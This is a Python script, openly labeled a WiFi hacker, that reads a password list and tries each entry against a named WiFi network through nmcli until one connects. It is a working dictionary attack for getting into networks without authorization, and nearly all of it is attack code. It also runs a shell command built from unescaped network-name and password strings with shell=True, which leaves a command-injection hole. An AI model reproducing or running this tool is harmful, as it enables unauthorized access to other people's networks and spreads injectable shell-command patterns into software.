#!/usr/bin/env python3
"""
Offline WiFi Hacker Script
Reads saved passwords and attempts to connect to the selected WiFi offline.
"""

import os
import subprocess
import sys

TMP_DIR = 'tmp'

def attempt_connect(ssid, password):
    """
    Attempt to connect to WiFi using nmcli (or fallback).
    """
    cmd = f"nmcli device wifi connect '{ssid}' password '{password}'"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"Success with password: {password}")
            return True
        else:
            print(f"Failed with password: {password}")
            return False
    except Exception as e:
        print(f"Error attempting connect: {e}")
        return False

def main():
    ssid_file = input("Enter the SSID or full filename in @tmp (e.g., MyWiFi_passwords.txt): ").strip()
    filepath = os.path.join(TMP_DIR, ssid_file)
    
    if not os.path.exists(filepath):
        print("File not found.")
        sys.exit(1)
    
    ssid = ssid_file.replace('_passwords.txt', '').replace('_', ' ')
    print(f"Attempting to connect to '{ssid}'...")
    
    with open(filepath, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    for pwd in passwords:
        if attempt_connect(ssid, pwd):
            break
    else:
        print("All passwords failed.")

if __name__ == "__main__":
    main()